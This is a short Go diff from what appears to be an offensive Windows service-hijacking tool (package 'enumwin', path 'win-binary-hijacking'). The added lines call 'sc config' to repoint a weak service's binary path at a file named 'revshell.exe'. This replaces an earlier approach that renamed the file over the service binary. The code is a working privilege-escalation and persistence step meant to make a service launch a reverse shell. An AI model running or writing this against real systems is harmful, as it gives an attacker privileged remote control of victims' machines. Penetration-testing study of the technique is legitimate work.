@@ -3,18 +3,23 @@ package enumwin
 import (
 	"fmt"
 	"os"
+	"os/exec"
 )
 
 func ChangeBinPath(serv *WeakServ) {
-
+	fmt.Println(serv.BinPath)
 	homeDir, _ := os.UserHomeDir()
 
 	malPath := fmt.Sprintf(homeDir + "\\win-binary-hijacking\\internal\\malbinaries\\revshell.exe")
 
-	err := os.Rename(malPath, homeDir+"\\"+serv.BinPath)
+	cmdFormat := fmt.Sprintf("binpath=%q", malPath)
+
+	fmt.Println(cmdFormat)
+	cmd := exec.Command("sc", "config", serv.Name, cmdFormat)
+
+	err := cmd.Run()
 
 	if err != nil {
-		fmt.Println("Can't do that")
+		fmt.Println(err, "Error")
 	}
-
 }
